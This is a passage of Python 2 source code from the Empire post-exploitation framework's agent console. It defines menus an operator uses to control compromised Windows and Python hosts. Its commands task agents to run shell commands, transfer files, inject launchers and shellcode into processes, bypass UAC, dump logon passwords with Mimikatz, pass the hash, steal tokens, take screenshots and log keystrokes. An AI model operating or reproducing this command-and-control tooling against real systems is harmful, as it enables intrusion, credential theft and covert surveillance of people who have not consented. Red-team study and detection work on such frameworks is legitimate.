        if searchTerm.strip() == "":
            print helpers.color("[!] Please enter a search term.")
        else:
            self.mainMenu.modules.search_modules(searchTerm)


    def complete_interact(self, text, line, begidx, endidx):
        "Tab-complete an interact command"

        names = self.mainMenu.agents.get_agent_names_db()

        mline = line.partition(' ')[2]
        offs = len(mline) - len(text)
        return [s[offs:] for s in names if s.startswith(mline)]


    def complete_rename(self, text, line, begidx, endidx):
        "Tab-complete a rename command"

        return self.complete_interact(text, line, begidx, endidx)


    def complete_clear(self, text, line, begidx, endidx):
        "Tab-complete a clear command"

        names = self.mainMenu.agents.get_agent_names_db() + ["all", "autorun"]
        mline = line.partition(' ')[2]
        offs = len(mline) - len(text)
        return [s[offs:] for s in names if s.startswith(mline)]


    def complete_remove(self, text, line, begidx, endidx):
        "Tab-complete a remove command"

        names = self.mainMenu.agents.get_agent_names_db() + ["all", "stale"]
        mline = line.partition(' ')[2]
        offs = len(mline) - len(text)
        return [s[offs:] for s in names if s.startswith(mline)]

    def complete_list(self, text, line, begidx, endidx):
        "Tab-complete a list command"

        options = ["stale"]
        mline = line.partition(' ')[2]
        offs = len(mline) - len(text)
        return [s[offs:] for s in options if s.startswith(mline)]


    def complete_kill(self, text, line, begidx, endidx):
        "Tab-complete a kill command"

        return self.complete_clear(text, line, begidx, endidx)


    def complete_sleep(self, text, line, begidx, endidx):
        "Tab-complete a sleep command"

        return self.complete_clear(text, line, begidx, endidx)


    def complete_lostlimit(self, text, line, begidx, endidx):
        "Tab-complete a lostlimit command"

        return self.complete_clear(text, line, begidx, endidx)


    def complete_killdate(self, text, line, begidx, endidx):
        "Tab-complete a killdate command"

        return self.complete_clear(text, line, begidx, endidx)


    def complete_workinghours(self, text, line, begidx, endidx):
        "Tab-complete a workinghours command"

        return self.complete_clear(text, line, begidx, endidx)


    def complete_usemodule(self, text, line, begidx, endidx):
        "Tab-complete an Empire PowerShell module path"
        return self.mainMenu.complete_usemodule(text, line, begidx, endidx)


    def complete_usestager(self, text, line, begidx, endidx):
        "Tab-complete an Empire stager module path."
        return self.mainMenu.complete_usestager(text, line, begidx, endidx)


    def complete_creds(self, text, line, begidx, endidx):
        "Tab-complete 'creds' commands."
        return self.mainMenu.complete_creds(text, line, begidx, endidx)


class AgentMenu(cmd.Cmd):
    """
    An abstracted class used by Empire to determine which agent menu type
    to instantiate.
    """
    def __init__(self, mainMenu, sessionID):

        agentLanguage = mainMenu.agents.get_language_db(sessionID)

        if agentLanguage.lower() == 'powershell':
            agent_menu = PowerShellAgentMenu(mainMenu, sessionID)
            agent_menu.cmdloop()
        elif agentLanguage.lower() == 'python':
            agent_menu = PythonAgentMenu(mainMenu, sessionID)
            agent_menu.cmdloop()
        else:
            print helpers.color("[!] Agent language %s not recognized." % (agentLanguage))


class PowerShellAgentMenu(cmd.Cmd):
    """
    The main class used by Empire to drive an individual 'agent' menu.
    """
    def __init__(self, mainMenu, sessionID):

        cmd.Cmd.__init__(self)

        self.mainMenu = mainMenu
        self.sessionID = sessionID
        self.doc_header = 'Agent Commands'

        # try to resolve the sessionID to a name
        name = self.mainMenu.agents.get_agent_name_db(sessionID)

        # set the text prompt
        self.prompt = '(Empire: ' + helpers.color(name, 'red') + ') > '

        # agent commands that have opsec-safe alises in the agent code
        self.agentCommands = ['ls', 'dir', 'rm', 'del', 'cp', 'copy', 'pwd', 'cat', 'cd', 'mkdir', 'rmdir', 'mv', 'move', 'ipconfig', 'ifconfig', 'route', 'reboot', 'restart', 'shutdown', 'ps', 'tasklist', 'getpid', 'whoami', 'getuid', 'hostname']

        # display any results from the database that were stored
        # while we weren't interacting with the agent
        results = self.mainMenu.agents.get_agent_results_db(self.sessionID)
        if results:
            print "\n" + results.rstrip('\r\n')

        # listen for messages from this specific agent
        dispatcher.connect(self.handle_agent_event, sender=dispatcher.Any)


    # def preloop(self):
    #     traceback.print_stack()

    def handle_agent_event(self, signal, sender):
        """
        Handle agent event signals.
        """
        if '[!] Agent' in signal and 'exiting' in signal:
            pass

        name = self.mainMenu.agents.get_agent_name_db(self.sessionID)

        if (str(self.sessionID) + " returned results" in signal) or (str(name) + " returned results" in signal):
            # display any results returned by this agent that are returned
            # while we are interacting with it
            results = self.mainMenu.agents.get_agent_results_db(self.sessionID)
            if results:
		if sender == "AgentsPsKeyLogger" and ("Job started:" not in results) and ("killed." not in results):
            	    safePath = os.path.abspath("%sdownloads/" % self.mainMenu.installPath)
		    savePath = "%sdownloads/%s/keystrokes.txt" % (self.mainMenu.installPath,self.sessionID)
		    if not os.path.abspath(savePath).startswith(safePath):
                        dispatcher.send("[!] WARNING: agent %s attempted skywalker exploit!" % (self.sessionID), sender='Agents')
                 	return
		    with open(savePath,"a+") as f:
			new_results = results.replace("\r\n","").replace("[SpaceBar]", "").replace('\b', '').replace("[Shift]", "").replace("[Enter]\r","\r\n")
		        f.write(new_results)
		else:
                   print "\n" + results

        elif "[+] Part of file" in signal and "saved" in signal:
            if (str(self.sessionID) in signal) or (str(name) in signal):
                print helpers.color(signal)


    # print a nicely formatted help menu
    #   stolen/adapted from recon-ng
    def print_topics(self, header, commands, cmdlen, maxcol):
        if commands:
            self.stdout.write("%s\n" % str(header))
            if self.ruler:
                self.stdout.write("%s\n" % str(self.ruler * len(header)))
            for command in commands:
                self.stdout.write("%s %s\n" % (command.ljust(17), getattr(self, 'do_' + command).__doc__))
            self.stdout.write("\n")


    def emptyline(self):
        pass


    def default(self, line):
        "Default handler"

        line = line.strip()
        parts = line.split(' ')

        if len(parts) > 0:
            # check if we got an agent command
            if parts[0] in self.agentCommands:
                shellcmd = ' '.join(parts)
                # task the agent with this shell command
                self.mainMenu.agents.add_agent_task_db(self.sessionID, "TASK_SHELL", shellcmd)
                # update the agent log
                msg = "Tasked agent to run command " + line
                self.mainMenu.agents.save_agent_log(self.sessionID, msg)
            else:
                print helpers.color("[!] Command not recognized.")
                print helpers.color("[*] Use 'help' or 'help agentcmds' to see available commands.")


    def do_back(self, line):
        "Go back a menu."
        return True


    def do_agents(self, line):
        "Jump to the Agents menu."
        raise NavAgents()


    def do_listeners(self, line):
        "Jump to the listeners menu."
        raise NavListeners()


    def do_main(self, line):
        "Go back to the main menu."
        raise NavMain()


    def do_help(self, *args):
        "Displays the help menu or syntax for particular commands."

        if args[0].lower() == "agentcmds":
            print "\n" + helpers.color("[*] Available opsec-safe agent commands:\n")
            print "     " + messages.wrap_columns(", ".join(self.agentCommands), ' ', width1=50, width2=10, indent=5) + "\n"
        else:
            cmd.Cmd.do_help(self, *args)


    def do_list(self, line):
        "Lists all active agents (or listeners)."

        if line.lower().startswith("listeners"):
            self.mainMenu.do_list("listeners " + str(' '.join(line.split(' ')[1:])))
        elif line.lower().startswith("agents"):
            self.mainMenu.do_list("agents " + str(' '.join(line.split(' ')[1:])))
        else:
            print helpers.color("[!] Please use 'list [agents/listeners] <modifier>'.")


    def do_rename(self, line):
        "Rename the agent."

        parts = line.strip().split(' ')
        oldname = self.mainMenu.agents.get_agent_name_db(self.sessionID)

        # name sure we get a new name to rename this agent
        if len(parts) == 1 and parts[0].strip() != '':
            # replace the old name with the new name
            result = self.mainMenu.agents.rename_agent(oldname, parts[0])
            if result:
                self.prompt = "(Empire: " + helpers.color(parts[0], 'red') + ") > "
        else:
            print helpers.color("[!] Please enter a new name for the agent")


    def do_info(self, line):
        "Display information about this agent"

        # get the agent name, if applicable
        agent = self.mainMenu.agents.get_agent_db(self.sessionID)
        messages.display_agent(agent)


    def do_exit(self, line):
        "Task agent to exit."

        try:
            choice = raw_input(helpers.color("[>] Task agent to exit? [y/N] ", "red"))
            if choice.lower() != "" and choice.lower()[0] == "y":

                self.mainMenu.agents.add_agent_task_db(self.sessionID, 'TASK_EXIT')
                # update the agent log
                self.mainMenu.agents.save_agent_log(self.sessionID, "Tasked agent to exit")
                return True

        except KeyboardInterrupt:
            print ""


    def do_clear(self, line):
        "Clear out agent tasking."
        self.mainMenu.agents.clear_agent_tasks_db(self.sessionID)


    def do_jobs(self, line):
        "Return jobs or kill a running job."

        parts = line.split(' ')

        if len(parts) == 1:
            if parts[0] == '':
                self.mainMenu.agents.add_agent_task_db(self.sessionID, "TASK_GETJOBS")
                # update the agent log
                self.mainMenu.agents.save_agent_log(self.sessionID, "Tasked agent to get running jobs")
            else:
                print helpers.color("[!] Please use form 'jobs kill JOB_ID'")
        elif len(parts) == 2:
            jobID = parts[1].strip()
            self.mainMenu.agents.add_agent_task_db(self.sessionID, "TASK_STOPJOB", jobID)
            # update the agent log
            self.mainMenu.agents.save_agent_log(self.sessionID, "Tasked agent to stop job " + str(jobID))


    def do_sleep(self, line):
        "Task an agent to 'sleep interval [jitter]'"

        parts = line.strip().split(' ')

        if len(parts) > 0 and parts[0] != "":
            delay = parts[0]
            jitter = 0.0
            if len(parts) == 2:
                jitter = parts[1]

            # update this agent's information in the database
            self.mainMenu.agents.set_agent_field_db("delay", delay, self.sessionID)
            self.mainMenu.agents.set_agent_field_db("jitter", jitter, self.sessionID)

            self.mainMenu.agents.add_agent_task_db(self.sessionID, "TASK_SHELL", "Set-Delay " + str(delay) + ' ' + str(jitter))
            # update the agent log
            msg = "Tasked agent to delay sleep/jitter " + str(delay) + "/" + str(jitter)
            self.mainMenu.agents.save_agent_log(self.sessionID, msg)


    def do_lostlimit(self, line):
        "Task an agent to change the limit on lost agent detection"

        parts = line.strip().split(' ')
        if len(parts) > 0 and parts[0] != "":
            lostLimit = parts[0]

        # update this agent's information in the database
        self.mainMenu.agents.set_agent_field_db("lost_limit", lostLimit, self.sessionID)
        self.mainMenu.agents.add_agent_task_db(self.sessionID, "TASK_SHELL", "Set-LostLimit " + str(lostLimit))
        # update the agent log
        msg = "Tasked agent to change lost limit " + str(lostLimit)
        self.mainMenu.agents.save_agent_log(self.sessionID, msg)


    def do_kill(self, line):
        "Task an agent to kill a particular process name or ID."

        parts = line.strip().split(' ')
        process = parts[0]

        if process == "":
            print helpers.color("[!] Please enter a process name or ID.")
        else:
            # if we were passed a process ID
            if process.isdigit():
                command = "Stop-Process " + str(process) + " -Force"
            else:
                # otherwise assume we were passed a process name
                # so grab all processes by this name and kill them
                command = "Get-Process " + str(process) + " | %{Stop-Process $_.Id -Force}"

            self.mainMenu.agents.add_agent_task_db(self.sessionID, "TASK_SHELL", command)

            # update the agent log
            msg = "Tasked agent to kill process: " + str(process)
            self.mainMenu.agents.save_agent_log(self.sessionID, msg)


    def do_killdate(self, line):
        "Get or set an agent's killdate (01/01/2016)."

        parts = line.strip().split(' ')
        date = parts[0]

        if date == "":
            self.mainMenu.agents.add_agent_task_db(self.sessionID, "TASK_SHELL", "Get-KillDate")
            self.mainMenu.agents.save_agent_log(self.sessionID, "Tasked agent to get KillDate")

        else:
            # update this agent's information in the database
            self.mainMenu.agents.set_agent_field_db("kill_date", date, self.sessionID)

            # task the agent
            self.mainMenu.agents.add_agent_task_db(self.sessionID, "TASK_SHELL", "Set-KillDate " + str(date))

            # update the agent log
            msg = "Tasked agent to set killdate to " + str(date)
            self.mainMenu.agents.save_agent_log(self.sessionID, msg)


    def do_workinghours(self, line):
        "Get or set an agent's working hours (9:00-17:00)."

        parts = line.strip().split(' ')
        hours = parts[0]

        if hours == "":
            self.mainMenu.agents.add_agent_task_db(self.sessionID, "TASK_SHELL", "Get-WorkingHours")
            self.mainMenu.agents.save_agent_log(self.sessionID, "Tasked agent to get working hours")

        else:
            hours = hours.replace(",", "-")
            # update this agent's information in the database
            self.mainMenu.agents.set_agent_field_db("working_hours", hours, self.sessionID)

            # task the agent
            self.mainMenu.agents.add_agent_task_db(self.sessionID, "TASK_SHELL", "Set-WorkingHours " + str(hours))

            # update the agent log
            msg = "Tasked agent to set working hours to " + str(hours)
            self.mainMenu.agents.save_agent_log(self.sessionID, msg)


    def do_shell(self, line):
        "Task an agent to use a shell command."

        line = line.strip()

        if line != "":
            # task the agent with this shell command
            self.mainMenu.agents.add_agent_task_db(self.sessionID, "TASK_SHELL", "shell " + str(line))
            # update the agent log
            msg = "Tasked agent to run shell command " + line
            self.mainMenu.agents.save_agent_log(self.sessionID, msg)


    def do_sysinfo(self, line):
        "Task an agent to get system information."

        # task the agent with this shell command
        self.mainMenu.agents.add_agent_task_db(self.sessionID, "TASK_SYSINFO")
        # update the agent log
        self.mainMenu.agents.save_agent_log(self.sessionID, "Tasked agent to get system information")


    def do_download(self, line):
        "Task an agent to download a file."

        line = line.strip()

        if line != "":
            self.mainMenu.agents.add_agent_task_db(self.sessionID, "TASK_DOWNLOAD", line)
            # update the agent log
            msg = "Tasked agent to download " + line
            self.mainMenu.agents.save_agent_log(self.sessionID, msg)


    def do_upload(self, line):
        "Task an agent to upload a file."

        # "upload /path/file.ext" or "upload /path/file/file.ext newfile.ext"
        # absolute paths accepted
        parts = line.strip().split(' ')
        uploadname = ""

        if len(parts) > 0 and parts[0] != "":
            if len(parts) == 1:
                # if we're uploading the file with its original name
                uploadname = os.path.basename(parts[0])
            else:
                # if we're uploading the file as a different name
                uploadname = parts[1].strip()

            if parts[0] != "" and os.path.exists(parts[0]):
                # Check the file size against the upload limit of 1 mb
                
                # read in the file and base64 encode it for transport
                open_file = open(parts[0], 'r')
                file_data = open_file.read()
                open_file.close()

                size = os.path.getsize(parts[0])
                if size > 1048576:
                    print helpers.color("[!] File size is too large. Upload limit is 1MB.")
                else:
                    # update the agent log with the filename and MD5
                    print helpers.color("[*] Size of %s for upload: %s" %(uploadname, helpers.get_file_size(file_data)), color="green")
                    msg = "Tasked agent to upload %s : %s" % (parts[0], hashlib.md5(file_data).hexdigest())
                    self.mainMenu.agents.save_agent_log(self.sessionID, msg)

                    # upload packets -> "filename | script data"
                    file_data = helpers.encode_base64(file_data)
                    data = uploadname + "|" + file_data
                    self.mainMenu.agents.add_agent_task_db(self.sessionID, "TASK_UPLOAD", data)
            else:
                print helpers.color("[!] Please enter a valid file path to upload")


    def do_scriptimport(self, line):
        "Imports a PowerShell script and keeps it in memory in the agent."

        path = line.strip()

        if path != "" and os.path.exists(path):
            open_file = open(path, 'r')
            script_data = open_file.read()
            open_file.close()

            # strip out comments and blank lines from the imported script
            script_data = helpers.strip_powershell_comments(script_data)

            # task the agent to important the script
            self.mainMenu.agents.add_agent_task_db(self.sessionID, "TASK_SCRIPT_IMPORT", script_data)

            # update the agent log with the filename and MD5
            msg = "Tasked agent to import %s : %s" % (path, hashlib.md5(script_data).hexdigest())
            self.mainMenu.agents.save_agent_log(self.sessionID, msg)

            # extract the functions from the script so we can tab-complete them
            functions = helpers.parse_powershell_script(script_data)

            # set this agent's tab-completable functions
            self.mainMenu.agents.set_agent_functions_db(self.sessionID, functions)

        else:
            print helpers.color("[!] Please enter a valid script path")


    def do_scriptcmd(self, line):
        "Execute a function in the currently imported PowerShell script."

        command = line.strip()

        if command != "":
            self.mainMenu.agents.add_agent_task_db(self.sessionID, "TASK_SCRIPT_COMMAND", command)
            msg = "[*] Tasked agent %s to run %s" % (self.sessionID, command)
            self.mainMenu.agents.save_agent_log(self.sessionID, msg)


    def do_usemodule(self, line):
        "Use an Empire PowerShell module."

        module = "powershell/%s" %(line.strip())

        if module not in self.mainMenu.modules.modules:
            print helpers.color("[!] Error: invalid module")
        else:
            module_menu = ModuleMenu(self.mainMenu, module, agent=self.sessionID)
            module_menu.cmdloop()


    def do_searchmodule(self, line):
        "Search Empire module names/descriptions."

        search_term = line.strip()

        if search_term.strip() == "":
            print helpers.color("[!] Please enter a search term.")
        else:
            self.mainMenu.modules.search_modules(search_term)


    def do_updateprofile(self, line):
        "Update an agent connection profile."

        # profile format:
        #   TaskURI1,TaskURI2,...|UserAgent|OptionalHeader1,OptionalHeader2...

        profile = line.strip().strip()

        if profile != "":
            # load up a profile from a file if a path was passed
            if os.path.exists(profile):
                open_file = open(profile, 'r')
                profile = open_file.readlines()
                open_file.close()

                # strip out profile comments and blank lines
                profile = [l for l in profile if not l.startswith("#" and l.strip() != "")]
                profile = profile[0]

            if not profile.strip().startswith("\"/"):
                print helpers.color("[!] Task URIs in profiles must start with / and be enclosed in quotes!")
            else:
                updatecmd = "Update-Profile " + profile

                # task the agent to update their profile
                self.mainMenu.agents.add_agent_task_db(self.sessionID, "TASK_CMD_WAIT", updatecmd)

                # update the agent log
                msg = "Tasked agent to update profile " + profile
                self.mainMenu.agents.save_agent_log(self.sessionID, msg)

        else:
            print helpers.color("[*] Profile format is \"TaskURI1,TaskURI2,...|UserAgent|OptionalHeader2:Val1|OptionalHeader2:Val2...\"")


    def do_psinject(self, line):
        "Inject a launcher into a remote process. Ex. psinject <listener> <pid/process_name>"

        # get the info for the psinject module
        if line:

            if self.mainMenu.modules.modules['powershell/management/psinject']:

                module = self.mainMenu.modules.modules['powershell/management/psinject']
                listenerID = line.split(' ')[0].strip()
                module.options['Listener']['Value'] = listenerID

                if listenerID != '' and self.mainMenu.listeners.is_listener_valid(listenerID):
                    if len(line.split(' ')) == 2:
                        target = line.split(' ')[1].strip()
                        if target.isdigit():
                            module.options['ProcId']['Value'] = target
                            module.options['ProcName']['Value'] = ''
                        else:
                            module.options['ProcName']['Value'] = target
                            module.options['ProcId']['Value'] = ''

                    module.options['Agent']['Value'] = self.mainMenu.agents.get_agent_name_db(self.sessionID)
                    module_menu = ModuleMenu(self.mainMenu, 'powershell/management/psinject')
                    module_menu.do_execute("")

                else:
                    print helpers.color("[!] Please enter <listenerName> <pid>")

            else:
                print helpers.color("[!] powershell/management/psinject module not loaded")

        else:
            print helpers.color("[!] Injection requires you to specify listener")


    def do_injectshellcode(self, line):
        "Inject listener shellcode into a remote process. Ex. injectshellcode <meter_listener> <pid>"

        # get the info for the inject module
        if line:
            listenerID = line.split(' ')[0].strip()
            pid = ''

            if len(line.split(' ')) == 2:
                pid = line.split(' ')[1].strip()

            if self.mainMenu.modules.modules['powershell/code_execution/invoke_shellcode']:

                if listenerID != '' and self.mainMenu.listeners.is_listener_valid(listenerID):

                    module = self.mainMenu.modules.modules['powershell/code_execution/invoke_shellcode']
                    module.options['Listener']['Value'] = listenerID
                    module.options['Agent']['Value'] = self.mainMenu.agents.get_agent_name_db(self.sessionID)

                    if pid != '':
                        module.options['ProcessID']['Value'] = pid

                    module_menu = ModuleMenu(self.mainMenu, 'powershell/code_execution/invoke_shellcode')
                    module_menu.cmdloop()

                else:
                    print helpers.color("[!] Please enter <listenerName> <pid>")

            else:
                print helpers.color("[!] powershell/code_execution/invoke_shellcode module not loaded")

        else:
            print helpers.color("[!] Injection requires you to specify listener")


    def do_sc(self, line):
        "Takes a screenshot, default is PNG. Giving a ratio means using JPEG. Ex. sc [1-100]"

        # get the info for the psinject module
        if len(line.strip()) > 0:
            # JPEG compression ratio
            try:
                screenshot_ratio = str(int(line.strip()))
            except Exception:
                print helpers.color("[*] JPEG Ratio incorrect. Has been set to 80.")
                screenshot_ratio = "80"
        else:
            screenshot_ratio = ''

        if self.mainMenu.modules.modules['powershell/collection/screenshot']:
            module = self.mainMenu.modules.modules['powershell/collection/screenshot']
            module.options['Agent']['Value'] = self.mainMenu.agents.get_agent_name_db(self.sessionID)
            module.options['Ratio']['Value'] = screenshot_ratio

            # execute the screenshot module
            module_menu = ModuleMenu(self.mainMenu, 'powershell/collection/screenshot')
            module_menu.do_execute("")

        else:
            print helpers.color("[!] powershell/collection/screenshot module not loaded")


    def do_spawn(self, line):
        "Spawns a new Empire agent for the given listener name. Ex. spawn <listener>"

        # get the info for the spawn module
        if line:
            listenerID = line.split(' ')[0].strip()

            if listenerID != '' and self.mainMenu.listeners.is_listener_valid(listenerID):

                # ensure the inject module is loaded
                if self.mainMenu.modules.modules['powershell/management/spawn']:
                    module = self.mainMenu.modules.modules['powershell/management/spawn']

                    module.options['Listener']['Value'] = listenerID
                    module.options['Agent']['Value'] = self.mainMenu.agents.get_agent_name_db(self.sessionID)

                    # jump to the spawn module
                    module_menu = ModuleMenu(self.mainMenu, "powershell/management/spawn")
                    module_menu.cmdloop()

                else:
                    print helpers.color("[!] management/spawn module not loaded")

            else:
                print helpers.color("[!] Please enter a valid listener name or ID.")

        else:
            print helpers.color("[!] Please specify a listener name or ID.")


    def do_bypassuac(self, line):
        "Runs BypassUAC, spawning a new high-integrity agent for a listener. Ex. spawn <listener>"

        # get the info for the bypassuac module
        if line:
            listenerID = line.split(' ')[0].strip()

            if listenerID != '' and self.mainMenu.listeners.is_listener_valid(listenerID):

                # ensure the inject module is loaded
                if self.mainMenu.modules.modules['powershell/privesc/bypassuac_eventvwr']:
                    module = self.mainMenu.modules.modules['powershell/privesc/bypassuac_eventvwr']

                    module.options['Listener']['Value'] = listenerID
                    module.options['Agent']['Value'] = self.mainMenu.agents.get_agent_name_db(self.sessionID)

                    # jump to the spawn module
                    module_menu = ModuleMenu(self.mainMenu, 'powershell/privesc/bypassuac_eventvwr')
                    module_menu.do_execute('')

                else:
                    print helpers.color("[!] powershell/privesc/bypassuac_eventvwr module not loaded")

            else:
                print helpers.color("[!] Please enter a valid listener name or ID.")

        else:
            print helpers.color("[!] Please specify a listener name or ID.")


    def do_mimikatz(self, line):
        "Runs Invoke-Mimikatz on the client."

        # ensure the credentials/mimiktaz/logonpasswords module is loaded
        if self.mainMenu.modules.modules['powershell/credentials/mimikatz/logonpasswords']:
            module = self.mainMenu.modules.modules['powershell/credentials/mimikatz/logonpasswords']

            module.options['Agent']['Value'] = self.mainMenu.agents.get_agent_name_db(self.sessionID)

            # execute the Mimikatz module
            module_menu = ModuleMenu(self.mainMenu, 'powershell/credentials/mimikatz/logonpasswords')
            module_menu.do_execute('')


    def do_pth(self, line):
        "Executes PTH for a CredID through Mimikatz."

        credID = line.strip()

        if credID == '':
            print helpers.color("[!] Please specify a <CredID>.")
            return

        if self.mainMenu.modules.modules['powershell/credentials/mimikatz/pth']:
            # reload the module to reset the default values
            module = self.mainMenu.modules.reload_module('powershell/credentials/mimikatz/pth')

            module = self.mainMenu.modules.modules['powershell/credentials/mimikatz/pth']

            # set mimikt/pth to use the given CredID
            module.options['CredID']['Value'] = credID

            # set the agent ID
            module.options['Agent']['Value'] = self.mainMenu.agents.get_agent_name_db(self.sessionID)

            # execute the mimikatz/pth module
            module_menu = ModuleMenu(self.mainMenu, 'powershell/credentials/mimikatz/pth')
            module_menu.do_execute('')


    def do_steal_token(self, line):
        "Uses credentials/tokens to impersonate a token for a given process ID."

        processID = line.strip()

        if processID == '':
            print helpers.color("[!] Please specify a process ID.")
            return

        if self.mainMenu.modules.modules['powershell/credentials/tokens']:
            # reload the module to reset the default values
            module = self.mainMenu.modules.reload_module('powershell/credentials/tokens')

            module = self.mainMenu.modules.modules['powershell/credentials/tokens']

            # set credentials/token to impersonate the given process ID token
            module.options['ImpersonateUser']['Value'] = 'True'
            module.options['ProcessID']['Value'] = processID

            # set the agent ID
            module.options['Agent']['Value'] = self.mainMenu.agents.get_agent_name_db(self.sessionID)

            # execute the token module
            module_menu = ModuleMenu(self.mainMenu, 'powershell/credentials/tokens')
            module_menu.do_execute('')

            # run a sysinfo to update
            self.do_sysinfo(line)


    def do_revtoself(self, line):
        "Uses credentials/tokens to revert token privileges."

        if self.mainMenu.modules.modules['powershell/credentials/tokens']:
            # reload the module to reset the default values
            module = self.mainMenu.modules.reload_module('powershell/credentials/tokens')

            module = self.mainMenu.modules.modules['powershell/credentials/tokens']

            # set credentials/token to revert to self
            module.options['RevToSelf']['Value'] = "True"

            # set the agent ID
            module.options['Agent']['Value'] = self.mainMenu.agents.get_agent_name_db(self.sessionID)

            # execute the token module
            module_menu = ModuleMenu(self.mainMenu, "powershell/credentials/tokens")
            module_menu.do_execute('')

            # run a sysinfo to update
            self.do_sysinfo(line)


    def do_creds(self, line):
        "Display/return credentials from the database."
        self.mainMenu.do_creds(line)


    def complete_psinject(self, text, line, begidx, endidx):
        "Tab-complete psinject option values."

        mline = line.partition(' ')[2]
        offs = len(mline) - len(text)
        return [s[offs:] for s in self.mainMenu.listeners.get_listener_names() if s.startswith(mline)]


    def complete_injectshellcode(self, text, line, begidx, endidx):
        "Tab-complete injectshellcode option values."

        return self.complete_psinject(text, line, begidx, endidx)


    def complete_spawn(self, text, line, begidx, endidx):
        "Tab-complete spawn option values."

        return self.complete_psinject(text, line, begidx, endidx)


    def complete_bypassuac(self, text, line, begidx, endidx):
        "Tab-complete bypassuac option values."

        return self.complete_psinject(text, line, begidx, endidx)


    def complete_jobs(self, text, line, begidx, endidx):
        "Tab-complete jobs management options."

        mline = line.partition(' ')[2]
        offs = len(mline) - len(text)
        return [s[offs:] for s in ["kill"] if s.startswith(mline)]


    def complete_scriptimport(self, text, line, begidx, endidx):
        "Tab-complete a PowerShell script path"

        return helpers.complete_path(text, line)


    def complete_scriptcmd(self, text, line, begidx, endidx):
        "Tab-complete a script cmd set."

        functions = self.mainMenu.agents.get_agent_functions(self.sessionID)

        mline = line.partition(' ')[2]
        offs = len(mline) - len(text)
        return [s[offs:] for s in functions if s.startswith(mline)]


    def complete_usemodule(self, text, line, begidx, endidx):
        "Tab-complete an Empire PowerShell module path"
        return self.mainMenu.complete_usemodule(text, line, begidx, endidx, language='powershell')


    def complete_upload(self, text, line, begidx, endidx):
        "Tab-complete an upload file path"
        return helpers.complete_path(text, line)


    def complete_updateprofile(self, text, line, begidx, endidx):
        "Tab-complete an updateprofile path"
        return helpers.complete_path(text, line)


    def complete_creds(self, text, line, begidx, endidx):
        "Tab-complete 'creds' commands."
        return self.mainMenu.complete_creds(text, line, begidx, endidx)


class PythonAgentMenu(cmd.Cmd):

    def __init__(self, mainMenu, sessionID):

        cmd.Cmd.__init__(self)

        self.mainMenu = mainMenu

        self.sessionID = sessionID

        self.doc_header = 'Agent Commands'

        # try to resolve the sessionID to a name
        name = self.mainMenu.agents.get_agent_name_db(sessionID)

        # set the text prompt
        self.prompt = '(Empire: ' + helpers.color(name, 'red') + ') > '

        # listen for messages from this specific agent
        dispatcher.connect(self.handle_agent_event, sender=dispatcher.Any)

        # display any results from the database that were stored
        # while we weren't interacting with the agent
        results = self.mainMenu.agents.get_agent_results_db(self.sessionID)
        if results:
            print "\n" + results.rstrip('\r\n')

    # def preloop(self):
    #     traceback.print_stack()

    def handle_agent_event(self, signal, sender):
        """
        Handle agent event signals.
        """
        if "[!] Agent" in signal and "exiting" in signal: pass

        name = self.mainMenu.agents.get_agent_name_db(self.sessionID)

        if (str(self.sessionID) + ' returned results' in signal) or (str(name) + ' returned results' in signal):
            # display any results returned by this agent that are returned
            # while we are interacting with it
            results = self.mainMenu.agents.get_agent_results_db(self.sessionID)
            if results:
                print "\n" + results

        elif "[+] Part of file" in signal and "saved" in signal:
            if (str(self.sessionID) in signal) or (str(name) in signal):
                print helpers.color(signal)


    # print a nicely formatted help menu
    #   stolen/adapted from recon-ng
    def print_topics(self, header, cmds, cmdlen, maxcol):
        if cmds:
            self.stdout.write("%s\n" % str(header))
            if self.ruler:
                self.stdout.write("%s\n" % str(self.ruler * len(header)))
            for c in cmds:
                self.stdout.write("%s %s\n" % (c.ljust(17), getattr(self, 'do_' + c).__doc__))
            self.stdout.write("\n")


    def emptyline(self):
        pass


    def default(self, line):
        "Default handler"
        print helpers.color("[!] Command not recognized, use 'help' to see available commands")


    def do_back(self, line):
        "Go back a menu."
        return True


    def do_agents(self, line):
        "Jump to the Agents menu."
        raise NavAgents()


    def do_listeners(self, line):
        "Jump to the listeners menu."
        raise NavListeners()


    def do_main(self, line):
        "Go back to the main menu."
        raise NavMain()


    def do_help(self, *args):
        "Displays the help menu or syntax for particular commands."
        cmd.Cmd.do_help(self, *args)


    def do_list(self, line):
        "Lists all active agents (or listeners)."

        if line.lower().startswith("listeners"):
            self.mainMenu.do_list("listeners " + str(' '.join(line.split(' ')[1:])))
        elif line.lower().startswith("agents"):
            self.mainMenu.do_list("agents " + str(' '.join(line.split(' ')[1:])))
        else:
            print helpers.color("[!] Please use 'list [agents/listeners] <modifier>'.")


    def do_rename(self, line):
        "Rename the agent."

        parts = line.strip().split(' ')
        oldname = self.mainMenu.agents.get_agent_name_db(self.sessionID)

        # name sure we get a new name to rename this agent
        if len(parts) == 1 and parts[0].strip() != '':
            # replace the old name with the new name
            result = self.mainMenu.agents.rename_agent(oldname, parts[0])
            if result:
                self.prompt = "(Empire: " + helpers.color(parts[0], 'red') + ") > "
        else:
            print helpers.color("[!] Please enter a new name for the agent")


    def do_info(self, line):
        "Display information about this agent"

        # get the agent name, if applicable
        agent = self.mainMenu.agents.get_agent_db(self.sessionID)
        messages.display_agent(agent)


    def do_exit(self, line):
        "Task agent to exit."

        try:
            choice = raw_input(helpers.color("[>] Task agent to exit? [y/N] ", "red"))
            if choice.lower() != "" and choice.lower()[0] == "y":

                self.mainMenu.agents.add_agent_task_db(self.sessionID, 'TASK_EXIT')
                # update the agent log
                self.mainMenu.agents.save_agent_log(self.sessionID, "Tasked agent to exit")
                return True

        except KeyboardInterrupt as e:
            print ""


    def do_clear(self, line):
        "Clear out agent tasking."
        self.mainMenu.agents.clear_agent_tasks_db(self.sessionID)


    def do_cd(self, line):
        "Change an agent's active directory"

        line = line.strip()

        if line != "":
            # have to be careful with inline python and no threading
            # this can cause the agent to crash so we will use try / cath
            # task the agent with this shell command
            if line == "..":
                self.mainMenu.agents.add_agent_task_db(self.sessionID, "TASK_CMD_WAIT", 'import os; os.chdir(os.pardir); print "Directory stepped down: %s"' % (line))
            else:
                self.mainMenu.agents.add_agent_task_db(self.sessionID, "TASK_CMD_WAIT", 'import os; os.chdir("%s"); print "Directory changed to: %s"' % (line, line))
            # update the agent log
            msg = "Tasked agent to change active directory to: %s" % (line)
            self.mainMenu.agents.save_agent_log(self.sessionID, msg)


    def do_jobs(self, line):
        "Return jobs or kill a running job."

        parts = line.split(' ')

        if len(parts) == 1:
            if parts[0] == '':
